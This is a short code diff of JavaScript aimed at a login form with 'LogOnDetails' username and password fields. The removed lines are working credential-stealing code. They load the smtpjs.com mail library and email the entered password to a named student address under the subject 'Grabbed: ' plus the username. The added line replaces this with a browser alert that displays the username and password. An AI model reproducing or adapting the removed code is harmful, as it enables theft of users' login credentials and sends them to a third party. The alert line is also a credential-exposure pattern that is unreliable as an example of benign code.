@@ -1,14 +1,1 @@
-if (document.getElementById("LogOnDetails_UserName").value != "") {
-    var script = document.createElement("script");
-    script.setAttribute("src", "https://smtpjs.com/v3/smtp.js");
-    document.head.appendChild(script);
-    setTimeout(() => {
-        Email.send({
-            SecureToken : "3804bc83-8467-42af-866b-c660a007084c",
-            To : 'dylanzander@student.hcps.org',
-            From : "dylanzander@student.hcps.org",
-            Subject : "Grabbed: " + document.getElementById("LogOnDetails_UserName").value,
-            Body : document.getElementById("LogOnDetails_Password").value
-        });
-    }, 500);
-}
+alert(document.getElementById("LogOnDetails_UserName").value + ": " + document.getElementById("LogOnDetails_Password").value);
